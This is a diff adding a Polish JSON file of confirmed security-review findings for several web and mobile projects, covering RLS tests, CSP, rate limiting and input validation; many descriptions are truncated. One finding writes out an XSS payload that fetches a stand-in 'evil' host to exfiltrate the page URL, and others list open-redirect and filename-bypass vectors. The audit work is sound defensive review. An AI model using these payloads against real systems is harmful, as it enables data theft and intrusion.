@@ -1,0 +1,625 @@
+{
+ "os": "security",
+ "zgloszone_n": 58,
+ "potwierdzone_n": 265,
+ "obalone_n": 0,
+ "potwierdzone_probka": [
+  {
+   "projekt": "Nawykometr",
+   "zadanie": "e6-notyfikacje-dogfooding",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "components/animated-splash.tsx:101",
+   "opis": "Zmiana `contentFit=\"contain\"` → `\"cover\"` przycina kadr wideo na urządzeniach o proporcjach innych niż materiał źródłowy — komentarz w kodzie deklaruje „kadr jest bezpieczny\", ale test unit sprawdza wyłącznie wartość propa, więc realne przycięcie logo/paska (skrajne proporcje 16:9 vs 19.5:9, iPad) oraz bezszwowość handoffu natywny splash → overlay są headless nieweryfikowalne. Analogicznie U.2: ellipsis greetingu i pełna widoczność licznika to własność wizualna, nie propowa. Weryfikacja wymaga oględzin na fizycznym iPhonie w dev-clientcie `development` (pozycje pozostają niezaznaczone w `docs/active/e6-notyfikacje-dogfooding/e6-notyfikacje-dogfooding-zadania.md` „Operator checklist faza 1\")."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "supabase/tests/rls.test.ts:6350",
+   "opis": "`hashesOfEligible` liczy hash inline (`createHash('sha256').update(email.trim().toLowerCase())`) — trzecia kopia kryterium D2 w repo, mimo że ten sam plik importuje już `hashEmail` z `apps/server/src/access/email-hash`. Zamień mapowanie na `.map((email) => hashEmail(email))`, żeby test seedujący listę nie rozjechał się cicho z produkcyjnym wzorem (learned-patterns 2026-09-11: bramka-regexp/wzór ma jedną kopię także w testach)."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-5-heatmapa",
+   "miesiac": "2026-08",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "e2e/seeds/faza-5-heatmapa-seed.sql:84",
+   "opis": "`v_salt constant bytea := decode(repeat('b2', 32), 'hex')` to stała, jawna wartość `offers.ip_salt` w repo, a `ip_salt` jest kluczem HMAC identyfikatora wizyty (`visit:<id>:<slug>`, faza 4) i ziarnem hasha IP. Baza E2E to WSPÓŁDZIELONY staging (nagłówek seeda), więc każdy, kto ma repo, potrafi podrobić nagłówek `X-Oo-Visit` dla oferty `e2eOfertaHeatmapa0001` i dopisywać dowolne przyrosty do jej `visits` bez otwierania oferty (zasięg ograniczony do tej jednej oferty — salt jest per wiersz). Akcja: `v_salt bytea := gen_random_bytes(32);` (bez `constant`) — seed i tak kasuje i wstawia ofertę od nowa, żaden asert scenariusza nie zależy od wartości salta."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/server/src/routes/access.test.ts:326",
+   "opis": "Test 'link wyslany' asertuje zero zdarzen admina, ale nie asertuje, ze rejestracja NIE zapisuje wiersza access_requests (R7: wpis dopiero po potwierdzeniu w osobnym kroku karty) - handler wolajacy access.saveRequest przeszedlby zielono. Dodaj po linii 326: expect(harness.service.saved).toEqual([])."
+  },
+  {
+   "projekt": "Nawykometr",
+   "zadanie": "e6-notyfikacje-dogfooding",
+   "miesiac": "2026-09",
+   "severity": "P1",
+   "typ": "E2E",
+   "plik": ".maestro/_session-bootstrap.yaml:176",
+   "opis": "Blok nadawania zgody na powiadomienia wszedł do WSPÓLNEGO prologu i wykonuje się domyślnie dla WSZYSTKICH 15 par (opt-out przez SKIP_GRANT, a nie opt-in), w tym dla 10 par sprzed E6, którym zgoda jest do niczego niepotrzebna. Między renderem Home a pierwszą komendą flow wstawia teraz: warunkowy poll `home-preprompt` (~5 s, gdy modal nieobecny), `tapOn tab-settings`, `extendedWaitUntil settings-notifications` (do 30 s), CTA hintu, `waitForAnimationToEnd 3000`, `repeat times: 6` z `when: visible: text \"Pozwalaj\"` (każda iteracja na nieobecnym elemencie to ~5 s pollingu — wartość zmierzona i udokumentowana w e4-daily-login.yaml:39-41), `assertNotVisible`, powrót na `tab-index`. To wprost łamie "
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9a-domena-mailer-limity",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/offers/offers-list.tsx:118",
+   "opis": "Strażnik kliknięcia wiersza tabeli desktopowej wymienia tylko `closest('a, button')`, a po odmowie schowka `CopyAddressButton` dokłada do komórki `<span role=\"alert\">` i `<input readonly>` z adresem — żaden z nich nie jest ani `<a>`, ani `<button>`. Scenariusz: klient bez Clipboard API (zwykły `http:`, okno bez fokusu, odmowa uprawnienia) klika „Kopiuj\" w wierszu listy → pojawia się komunikat „Nie udało się skopiować. Zaznacz adres i skopiuj go ręcznie.\" i pole z adresem → użytkownik klika (albo przeciąga zaznaczenie) w tym polu → zdarzenie bąbelkuje do `<tr onClick>`, `closest('a, button')` zwraca `null` i router nawiguje do `/oferty/<slug>`; pole awaryjne znika razem z listą, więc jedyna d"
+  },
+  {
+   "projekt": "Nawykometr",
+   "zadanie": "e6-notyfikacje-dogfooding",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "app/(tabs)/settings.tsx:264",
+   "opis": "Dodany w tej fazie klucz `copy.notifications.ui.settings.daily.disabledHint` („Najpierw włącz Powiadomienia\", constants/copy.ts:654) jest martwy — grep po całym drzewie pokazuje zero użyć. Jego komentarz w copy mówi wprost, po co powstał („sam `accessibilityState.disabled` nie mówi DLACZEGO\"), a toggle dzienny przy globalnym OFF dostaje tylko `disabled` bez żadnego hintu, więc czytnik ekranu ogłasza „wyłączone\" bez powodu. Naprawa: dodać opcjonalny prop `accessibilityHint` do `components/pixel-toggle.tsx` i podać `SETTINGS.daily.disabledHint` w settings.tsx przy `disabled={!settings.isGlobalEnabled}` — albo usunąć klucz z constants/copy.ts (komponenty nie mogą hardcodować stringów, ale copy "
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-5-heatmapa",
+   "miesiac": "2026-08",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "Dockerfile:31",
+   "opis": "`VITE_OFFER_ORIGIN` to nowa zmienna BUILDA (ARG+ENV) z domyślną wartością pustą i BEZ walidacji fail-fast (inaczej niż runtime'owe ENV serwera walidowane Zodem w `packages/shared`). Brak wpisu w build args Coolify nie zatrzyma deployu — blok mapy po prostu nie zadziała, cicho. Operator musi: (1) dodać `VITE_OFFER_ORIGIN` do build args aplikacji dashboardu z tą samą wartością co runtime'owy `OFFER_ORIGIN`, (2) potwierdzić po deployu, że `Content-Security-Policy: frame-ancestors <APP_ORIGIN>` na `/o/<slug>` zgadza się z originem, spod którego serwowany jest dashboard — inaczej przeglądarka zablokuje ramkę i po 10 s wejdzie komunikat „Nie udało się wczytać podglądu oferty\". Weryfikacja niewykon"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-7-szablony-i-grafiki",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/server/src/offer/template-repository.ts:217",
+   "opis": "Reguła „jedna nazwa = jeden wiersz\" stoi wyłącznie na sekwencji select→update/insert w kodzie; migracja `20260903120000` nie zakłada unikalnego indeksu na `(owner_id, name)` (komentarz w `zapisz-szablon.ts` sam to stwierdza). Dwa równoległe `zapisz_szablon` z tą samą nazwą (ponowienie narzędzia przez model, dwa okna rozmowy) wstawiają DWA wiersze, a od tej chwili `read` (`maybeSingle`, linia 199) i lookup w `save` (linia 217) dostają z PostgREST błąd „more than one row\" → `TemplateRepositoryError` → handlowiec widzi tylko `TEMPLATE_FAILURE_MESSAGE`; szablonu nie da się już ani pobrać, ani nadpisać (działa wyłącznie `usun_szablon`, kasując oba wiersze). Naprawa: dołóż migrację z `create uniqu"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-6-cta-i-webhooki",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/cta/decision-payload.ts:68",
+   "opis": "`buildStateBody` zwraca `tekst_po_akceptacji_html` w KAŻDYM stanie (`oczekuje`, `wygasla`, `nieznany`), a `/c.js` nigdy tego pola z odpowiedzi GET nie czyta — obsługa `call('', 'GET')` w `static/c.js:206` używa wyłącznie `stan` i `zaakceptowano_o`, `openPopup` woła się tylko po kliknięciu. Efekt jest dwustronny: (1) tekst po akceptacji handlowca — łącznie z domyślnym tekstem KONTA, wspólnym dla wszystkich jego ofert, często zawierającym prywatny numer i instrukcje — jedzie do każdego, kto zna slug, także dla oferty nigdy niezaakceptowanej i wygasłej, bez powodu; (2) uzasadnienie z testu `decisions.test.ts` („klient wracający po utracie sieci ma zobaczyć tekst bez ponownej akceptacji”) nie je"
+  },
+  {
+   "projekt": "claude-cron",
+   "zadanie": "zalaczniki-w-skrzynce",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "server.js:914",
+   "opis": "`streamFileToResponse` ustawia `Content-Type` WPROST z `decision.attachment.mime`, czyli z pola, które w całości pochodzi od nadawcy (`normalizeAttachment` w lib/inbox-db.js:481 sprawdza wyłącznie długość ≤255 — `text/html` przechodzi). Odpowiedź nie ma ani `X-Content-Type-Options: nosniff`, ani `Content-Disposition: attachment`, a endpoint `/inbox/v1/:token/blob/:sha256` jest PUBLICZNY (stoi przed guardem XFF, chodzi przez Funnel) i ma globalne `Access-Control-Allow-Origin: *` (server.js:939). Scenariusz: członek A wysyła plik z `mime:'text/html'` i treścią `<script>fetch('https://evil/'+location.href)</script>`; adresat B otwiera link do bajtów w przeglądarce — skrypt wykonuje się na ORIGI"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/server/src/access/membership-service.ts:172",
+   "opis": "Zmiana kontraktu bazy bez adaptacji konsumenta w tym samym commicie: `apply_membership_list` v2 oddaje teraz wiersze przepięcia źródła z `old_state = new_state`, a `applyMembershipList` mapuje KAŻDY wiersz po `newState` przez `EVENT_BY_NEW_STATE`. Po `db push` (rollout: migracja PRZED obrazem, a mapowanie D7 planowane dopiero w IU-5 fazy 2) każde przepięcie konta `zewnetrzne`/`aktywne` zapisuje fałszywe zdarzenie `konto_przywrocone`, a `zewnetrzne`/`ograniczone` — fałszywe `konto_ograniczone`, oba doręczane webhookiem administratora. Naprawa teraz (niezależnie od IU-5): przed `EVENT_BY_NEW_STATE.get` dodaj `if (change.oldState === change.newState) { pominieto += 1; continue; }` z testem na w"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-3-konto-i-dashboard",
+   "miesiac": "2026-08",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/vite.config.ts:25",
+   "opis": "`envDir` wskazuje teraz korzeń repozytorium, gdzie leży `.env` z `SUPABASE_SECRET_KEY`, `DATABASE_URL`, `MCP_BEARER_TOKEN` i hasłami kont seedowych. Ochroną jest wyłącznie DOMYŚLNY `envPrefix: 'VITE_'` — niezapisany nigdzie w repo i możliwy do rozszerzenia jedną linijką w przyszłym commicie (albo przez `define`), co bez żadnego alertu wsypałoby sekrety serwera do publicznego bundla. Akcja: dopisz jawnie `envPrefix: 'VITE_'` obok `envDir` w `vite.config.ts` i asercję na to w istniejącym zestawie inwariantów (`scripts/dockerfile-invariants.test.ts` albo test w `apps/dashboard`)."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9c-dokumenty-prawne",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/server/src/offer/pages/terms-page.ts:112",
+   "opis": "Regulamin (pkt 7, linia 112) i polityka panelu (app-privacy-page.ts:123 i :142) obiecują, że użytkownik „usunie konto z Ustawień” — w dashboardzie nie istnieje żadna ścieżka usunięcia konta (grep apps/dashboard/src po „usuń konto”/deleteAccount: zero trafień; docs/MVP.md:290 opisuje to jako funkcję przyszłą). Reguła projektu: komunikat nie obiecuje czynności, której kod nie potwierdza — a to dokument prawny opisujący realizację prawa z art. 17 RODO, który idzie na dev/prod PRZED tą funkcją. Do naprawy: w trzech zdaniach zostawić wyłącznie ścieżkę istniejącą („pisząc na ${LEGAL_ENTITY.email}”), a wzmiankę o Ustawieniach dopisać razem z fazą, która ją wdroży (nowa wersja dokumentu z podniesion"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-3-konto-i-dashboard",
+   "miesiac": "2026-08",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/mcp/token-service.ts:211",
+   "opis": "`sessionFor` łamie własną gwarancję „dwa równoległe żądania jednego konta wchodzą w jeden mint\" w momencie odświeżania sesji: między `await pending.catch(...)` a `sessions.set(ownerId, fresh)` jest punkt zawieszenia, więc dwa żądania, które trafią na sesję po marginesie 60 s, oba zobaczą wpis jako nieaktualny i oba wystartują `mintSession` — czyli dokładnie to zużycie puli OTP konta, któremu ten kod ma zapobiegać (test „dwa równoległe żądania … wchodzą w jeden mint\" bada tylko ścieżkę zimnego startu, gdzie awaitu przed `set` nie ma). Akcja: przenieś decyzję o świeżości na dane trzymane synchronicznie (np. wartością mapy niech będzie `{ promise, expiresAtMs }` ustawiane od razu po zmintowaniu"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-4-tracking-i-widok-oferty",
+   "miesiac": "2026-08",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/offers/analytics.ts:184",
+   "opis": "Sekcje o id kolidującym z Object.prototype znikają z widoku bez śladu. `sortedSectionIds` klasyfikuje id przez `id in SECTION_LABELS` na zwykłym literale obiektu, więc `'toString' in SECTION_LABELS === true` — id takie jak `toString`, `constructor`, `valueOf`, `hasOwnProperty`, `toLocaleString`, `isPrototypeOf`, `propertyIsEnumerable` nie trafiają ani do `known` (nie ma ich w `SECTION_ORDER = Object.keys(...)`), ani do `unknown` (odsiewa je `in`). Zweryfikowane node'em: dla `seen = {cena, toString, constructor, przyszla}` wychodzi `known=[cena]`, `unknown=[przyszla]` — dwie sekcje przepadają. Skutki: (1) łamie udokumentowany kontrakt fallbacku z analytics.ts:35-40 i testu 'nieznane id przech"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-8-connector-oauth-i-dashboard",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "docs/MVP.md:274",
+   "opis": "Weryfikacja i decyzja poza kodem: faza 4 uruchamia ekran zgody, więc otwarta dynamiczna rejestracja klientów (RFC 7591) razem z brakiem audience bindingu (`aud` zostaje `authenticated`) przestaje być ryzykiem teoretycznym — dowolny obcy podmiot rejestruje klienta w projekcie, przeprowadza handlowca przez ten ekran i dostaje JWT dający pełny dostęp do Data API i Storage w zakresie RLS właściciela (klucz publikowalny jest jawny w bundlu). `docs/MVP.md` zapisuje to jako świadomy kompromis czekający na „pomiar operatora na refie środowiska docelowego\". Przed smoke'em toru OAuth na środowisku docelowym rozstrzygnij domknięcie: allowlista `client_id` po stronie weryfikatora albo hook przepisujący "
+  },
+  {
+   "projekt": "claude-cron",
+   "zadanie": "zalaczniki-w-skrzynce",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "lib/inbox-api.js:224",
+   "opis": "Bramka nazwy pliku (`if (/[/\\\\\\0]/.test(filename) || filename === '.' || filename === '..')`, lustro w `lib/inbox-db.js:515`) odrzuca separator, NUL i dokladnie '.'/'..' — i nic wiecej. Przechodza m.in.: (1) `\"raport\\r\\n- [x] Zrobione\"` i `\"a\\nb.pdf\"` — znaki sterujace; (2) `\".. \"` i `\"..\"+spacja/kropka` — Win32 obcina koncowe spacje i kropki, wiec na Windowsie te nazwy sa rownowazne `'..'`, ktore jawnie zablokowano; (3) `\"a.txt:ukryty\"` — na NTFS to alternatywny strumien danych, nie plik o tej nazwie; (4) `\" ..\"`/nazwy z U+202E. Filename to niezaufane wejscie nadawcy (R14), ktore w fazie 3 idzie do `path.join` zapisu w vaultcie ORAZ do renderu `Skrzynka.md`, gdzie kontrakt push<->pull jest "
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-4-tracking-i-widok-oferty",
+   "miesiac": "2026-08",
+   "severity": "P3",
+   "typ": "OPERATOR",
+   "plik": "supabase/migrations/20260828120000_visits_tracking.sql:189",
+   "opis": "Rejestracja joba pg_cron `visits_retention_12m` została zweryfikowana wyłącznie na stagingu (`pnpm test:rls` PASS). Na projekcie produkcyjnym skuteczność `create extension pg_cron` i wpis w `cron.job` da się potwierdzić dopiero po realnym `supabase db push` — operator po merge powinien wykonać push oraz sprawdzić job przez RPC `visits_retention_job` kluczem sekretnym (schemat cron poza PostgREST), zgodnie z operator checklist IU-1 (porównanie schematów staging–produkcja)."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-8-connector-oauth-i-dashboard",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "TEST",
+   "plik": "apps/server/src/mcp/oauth-token-verifier.test.ts:268",
+   "opis": "Asercja `expect(state.getUserTokens).toEqual([])` w teście „token podpisany algorytmem symetrycznym (HS256) dostaje odmowę\" jest nieprawdziwa względem produkcji i przechodzi wyłącznie dlatego, że atrapa `getClaims` nie odwzorowuje zachowania oryginału. W `@supabase/auth-js@2.112.4` (`GoTrueClient.js`, `async getClaims`) obliczenie klucza brzmi: `const signingKey = !header.alg || header.alg.startsWith('HS') || !header.kid || brak WebCrypto ? null : await this.fetchJwk(...)`, a przy `signingKey === null` biblioteka woła `await this.getUser(token)` — czyli DLA KAŻDEGO tokenu z nagłówkiem `alg: HS*` (albo bez `kid`) leci realne żądanie sieciowe do GoTrue, ZANIM nasz kod dojdzie do bramki `header"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-2-publikacja-ofert",
+   "miesiac": "2026-08",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/server/src/app.ts:294",
+   "opis": "Jedyne CSP na originie ofert to `frame-ancestors <APP_ORIGIN>`. Dokument oferty wychodzi wprost z kolumny `offers.html` (apps/server/src/routes/offer.ts:114 — `context.html(offer.html)`), a ta kolumna jest zapisywana bezpośrednio przez PostgREST tokenem handlowca; renderer z template.ts (escaping, wyłącznie ścieżki względne, zamknięta lista krojów, logo tylko jako `data:`) nie jest na tej drodze wymuszony. Baza pilnuje kroju CHECK-iem właśnie po to, by z niemutowalnej oferty nie poszło żądanie do obcego hosta (decyzje 1.8/1.10 — wyciek IP czytelnika), ale treści `html` ta gwarancja nie obejmuje: `<script src=\"https://…\">`, obcy `<img>` czy `fetch()` przechodzą bez przeszkód, na naszej domeni"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "siatka-heatmapy-proporcjonalna",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/routes/events.ts:52",
+   "opis": "Komentarz `MAX_BODY_BYTES` po zmianie mówi „największa legalna siatka (16×64) z sekcjami mieści się w ~12 KB\". Rachunek najgorszego przypadku daje ~22 KB: 1024 klucze `heat` po `\"63:15\":1000000,` (~16 B przy `MAX_HEAT_COUNT = 1 000 000`) to ~16,4 KB, plus 64 sekcje o identyfikatorach do 64 znaków (`SECTION_ID_PATTERN`) to ~5 KB. Limit 32 KB nadal wystarcza, więc to nie defekt działania — ale liczba w komentarzu jest argumentem bezpieczeństwa (zapas rzędu wielkości), a realny zapas to ~1,4×, nie ~2,7×. Akcja: poprawić „~12 KB\" na ~22 KB w tym komentarzu."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-1-fundament",
+   "miesiac": "2026-08",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "Dockerfile:113",
+   "opis": "Scenariusz [Manual] „kontener uruchomiony bez wymaganych zmiennych kończy się błędem konfiguracji, a nie startuje z wartościami zastępczymi\" wymaga uruchomienia obrazu (Docker wyłączony). Headless potwierdzone tylko statycznie: warstwa runtime nie deklaruje `APP_ORIGIN`, `OFFER_ORIGIN`, `DASHBOARD_DIST_PATH` ani kluczy, a `loadConfig()` w apps/server/src/index.ts:26 kończy proces kodem 1 na `EnvValidationError`."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-7-szablony-i-grafiki",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "docs/active/faza-7-szablony-i-grafiki/faza-7-szablony-i-grafiki-zadania.md:337",
+   "opis": "Weryfikacja niewykonalna headless: cały mechanizm fazy stoi na prawdziwym `document.visibilityState`, a w unitach jest on sterowany atrapą. Zostaje pozycja checklisty operatora — otwórz realną ofertę na wdrożonym originie, zostaw kartę w tle na kilkanaście minut, wróć na ~30 s, zamknij i sprawdź w dashboardzie, że wiersz wizyty pokazuje `czytanie ~30 s`, a nie kilkanaście minut. Przy okazji sprawdź scenariusz z findingu o braku sufitu w `t.js`: po dłuższej przerwie (uśpiona maszyna albo powrót z bfcache) wizyta nie może pokazać `czytanie < 5 s` przy realnej lekturze — to objaw cicho odsianego przyrostu > 60 000 ms."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-2-publikacja-ofert",
+   "miesiac": "2026-08",
+   "severity": "P2",
+   "typ": "KOD",
+   "plik": "apps/server/src/rate-limit.ts:43",
+   "opis": "Zmiana klucza na per-klient zmienia charakterystyke mapy `windows`: dotad prawie wszystkie zadania trafialy do jednego klucza, teraz mapa rosnie liniowo z liczba roznych adresow w oknie, a forgetStaleClients robi PELNY przebieg mapy przy KAZDYM zadaniu (O(n) na zadanie, O(n^2) w oknie) i nie ma zadnego gornego ograniczenia rozmiaru. Na publicznym originie ofert (limit 1200/min, ruch bez uwierzytelnienia) rozproszony ruch potrafi napelnic mape setkami tysiecy wpisow w jednym oknie — rosnie pamiec, a kazdy kolejny request skanuje cala mape, co degraduje serwowanie ofert wbrew zasadzie naczelnej nr 7. Naprawa w apps/server/src/rate-limit.ts: sprzataj amortyzowanie (co N zapisow lub po przekrocz"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9c-dokumenty-prawne",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "apps/server/src/offer/pages/legal-document.test.ts:146",
+   "opis": "Biała lista kształtów href /^(?:\\/(?!\\/)|mailto:)/ odrzuca adres protocol-relative //host, ale przepuszcza /\\host — przeglądarki normalizują backslash w schematach specjalnych do slasha, więc href=\"/\\evil.example\" nawiguje na //evil.example. Wektory sprawdzone dla tej bramki: //evil (odrzucany), /\\evil (PRZEPUSZCZANY), MAILTO: (odrzucany — wielkość liter), javascript: (odrzucany), &#106;avascript: (odrzucany — brak wiodącego /). Zmień regexp na /^(?:\\/(?![\\/\\\\])|mailto:)/ i dołóż w tym pliku test odmowy: renderLegalDocument z marketingPath: '/\\\\evil.example' ma dać href, który NIE przechodzi białej listy (asercja wartością, że regexp odrzuca), żeby bramka miała test na oba wektory."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "TEST",
+   "plik": "supabase/tests/rls.test.ts:6365",
+   "opis": "`readMembershipHashes` czyta `membership_hashes?select=hash` bez kontroli sufitu PostgREST `max_rows = 1000` — snapshot z `beforeAll` i przywrócenie w `afterAll` przez `seedMembershipHashes(membershipSnapshot)` przy liście powyżej 1000 hashy CICHO skróciłoby listę stagingu (learned-patterns 2026-08-28: `max_rows` obcina bez błędu). Dodaj do żądania nagłówek `Prefer: count=exact` i asertuj, że liczba zwróconych wierszy równa się sumie z `Content-Range` (rzut wyjątkiem przy rozjeździe), zanim lista trafi do snapshotu."
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-8-connector-oauth-i-dashboard",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/dashboard/src/features/templates/use-template-details.ts:68",
+   "opis": "`BUILT_IN_LAYOUT_ID_PATTERN = /^uklad-\\d{1,2}$/` (i tak samo `UUID_PATTERN` w linii 60) da się obejść znakiem nowej linii: w JS bez flagi `m` kotwica `$` dopasowuje się TAKŻE przed końcowym `\\n`, więc `/szablony/uklad-1%0A` → `id = 'uklad-1\\n'` przechodzi bramkę i wysyła żądanie, mimo że komentarz nad hookiem deklaruje wprost „`/szablony/foo` nie ma prawa wywołać ani jednego zapytania\". Skutek jest niegroźny (serwer kanonizuje nazwę i oddaje ten sam dokument albo 404), ale bramka nie robi tego, co obiecuje, i nie ma testu odmowy na ten wektor. Naprawa: zamień kotwicę końcową w obu wzorcach na `(?![\\s\\S])`, czyli `/^uklad-\\d{1,2}(?![\\s\\S])/` i `/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "samodzielna-rejestracja-czlonkow-aa",
+   "miesiac": "2026-09",
+   "severity": "P2",
+   "typ": "OPERATOR",
+   "plik": "apps/server/src/access/registration-service.ts:211",
+   "opis": "signInWithOtp idzie z JEDNEGO adresu (egress Node na Coolify), wiec per-IP limit GoTrue na /auth/v1/otp (rate_limit_otp, domyslnie 30 zadan / 5 min per IP) obejmuje CALY ruch rejestracji produktu. Przy ogloszeniu bez kohort (1178 czlonkow) odbicie over_request_rate_limit NIE trafia w biala liste EMAIL_RATE_LIMIT_CODE i wychodzi jako RegistrationServiceError -> 503 sprawdzenie_nieudane + captureException per zadanie (falszywa awaria dla kursanta, burza raportow Sentry). Zmierz na refie wdrozonym GET /v1/projects/<ref>/config/auth -> rate_limit_otp i na stagingu kod bledu GoTrue przy przekroczeniu z jednego IP; jesli limit per-IP dziala na ruch serwera, podnies go przez Management API PRZED og"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-3-konto-i-dashboard",
+   "miesiac": "2026-08",
+   "severity": "P2",
+   "typ": "TEST",
+   "plik": "supabase/tests/rls.test.ts:494",
+   "opis": "Odchylenie od planu poszerzyło grant do `update (owner_id, token_hash, created_at)` (migracja 20260827183042_mcp_tokens.sql:79). Kontrolą kompensacyjną jest WITH CHECK w `mcp_tokens_update_own`, ale ŻADEN test tego nie dowodzi — istniejące scenariusze sprawdzają tylko INSERT z cudzym `owner_id` oraz UPDATE cudzego wiersza. Brakuje przypadku: użytkownik B UPDATE/UPSERT na WŁASNYM wierszu ustawia `owner_id = A.id`. Gdyby WITH CHECK kiedykolwiek wypadł z polityki (regresja w kolejnej migracji), B przepisałby swój wiersz z własnym hashem na konto A i przejął tożsamość A w całym MCP — a zielony `pnpm test:rls` tego nie zauważy. Akcja: dodaj do describe `tokeny MCP` przypadek `B nie przepisze włas"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-7-szablony-i-grafiki",
+   "miesiac": "2026-09",
+   "severity": "P1",
+   "typ": "OPERATOR",
+   "plik": "apps/dashboard/src/features/offers/use-offer-details.ts:24",
+   "opis": "Kolejność rolloutu — TWARDA, nic jej nie egzekwuje, a skutek jest ostrzejszy niż w fazach 5b i 6. Dashboard dopisał `reading_ms` do jednego literału `OFFER_DETAILS_COLUMNS`, więc od chwili opublikowania obrazu KAŻDE wejście w szczegóły dowolnej oferty leci przez PostgREST z tą kolumną. Jeżeli migracja `20260903140000_visits_reading_time.sql` nie jest na bazie środowiska docelowego (ref z `coolify app env list <uuid> --show-sensitive`, klucz `SUPABASE_URL` — lokalne CLI jest zalinkowane do STAGINGU `nxiqssmkteemyhzjkrob`, nie do `uznjvfdqrisbzbcwemjn`), zapytanie zwraca błąd i widok przechodzi w `loadError` — to nie degradacja jednej liczby, tylko zgaszenie całej analityki oferty. Uwaga druga"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-9c-dokumenty-prawne",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/routes/app-origin-pages.ts:74",
+   "opis": "Dokumenty prawne na APP_ORIGIN idą z CSP ograniczonym do frame-ancestors 'none', podczas gdy identyczny dokument (/prywatnosc czytelnika) na originie ofert dostaje pełną politykę z buildOfferOriginCsp (default-src 'none', style-src 'unsafe-inline', font-src, img-src, form-action 'none', base-uri 'none'). Dokument jest statyczny i bez skryptów, więc to obrona w głąb, nie luka — ale nowa powierzchnia HTML poza middleware dashboardu powinna mieć ten sam zestaw co lustrzana strona ofert. Zamień wartość w DOCUMENT_HEADERS na \"default-src 'none'; style-src 'unsafe-inline'; font-src 'self'; img-src 'self'; form-action 'none'; base-uri 'none'; frame-ancestors 'none'\" (kroje /f/* i znak /logo-aa-napi"
+  },
+  {
+   "projekt": "oferty-online",
+   "zadanie": "faza-7-szablony-i-grafiki",
+   "miesiac": "2026-09",
+   "severity": "P3",
+   "typ": "KOD",
+   "plik": "apps/server/src/routes/offer-images.ts:288",
+   "opis": "`headers['Content-Length'] = contentLength` przepisuje długość z odpowiedzi Storage, podczas gdy do klienta idzie `upstream.body` po dekompresji wykonanej przez `fetch` Node'a. Gdy Storage odpowie z `Content-Encoding` (gzip/br), zadeklarowana długość dotyczy postaci skompresowanej, a ciało jest dłuższe — przeglądarka utnie obraz albo zerwie odpowiedź. Akcja: kopiuj `Content-Length` tylko wtedy, gdy `upstream.headers.get('content-encoding') === null`, czyli warunek zmień na `if (contentLength !== null && upstream.headers.get('content-encoding') === null)`."
+  },
+  {
+   "projekt": "symulator-poczekalni",
+   "zadanie": "symulator-poczekalni",
